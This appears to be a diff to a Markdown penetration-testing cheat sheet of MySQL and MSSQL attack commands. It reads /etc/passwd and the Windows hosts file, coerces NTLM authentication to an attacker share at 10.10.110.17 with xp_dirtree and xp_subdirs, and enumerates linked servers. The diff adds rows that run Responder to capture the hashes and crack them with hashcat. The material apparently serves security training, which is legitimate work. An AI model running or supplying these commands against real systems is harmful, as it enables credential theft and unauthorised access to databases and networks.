@@ -54,7 +54,9 @@
 | `mysql> show variables like "secure_file_priv";` | Check if the the secure file privileges are empty to read locally stored files on the system. |
 | `sqlcmd> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents` | Read local files in MSSQL. |
 | `mysql> select LOAD_FILE("/etc/passwd");` | Read local files in MySQL. |
+| `bash> sudo responder -I tun0` | Start responder on interface tun0 to receive authentication request from sqlcmd `xp_dirtree` command in MSSQL. |
 | `sqlcmd> EXEC master..xp_dirtree '\\10.10.110.17\share\'` | Hash stealing using the `xp_dirtree` command in MSSQL. |
+| `DOS> hashcat.exe -a 0 -m 5600 s:\hashes\responder-hashes.txt s:\wordlists\mut_password.list -O'` | Crack stolen NTLMv2 Hash obtained from responder using hashcat. |
 | `sqlcmd> EXEC master..xp_subdirs '\\10.10.110.17\share\'` | Hash stealing using the `xp_subdirs` command in MSSQL. |
 | `sqlcmd> SELECT srvname, isremote FROM sysservers` | Identify linked servers in MSSQL.  |
 | `sqlcmd> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]` | Identify the user and its privileges used for the remote connection in MSSQL.  |
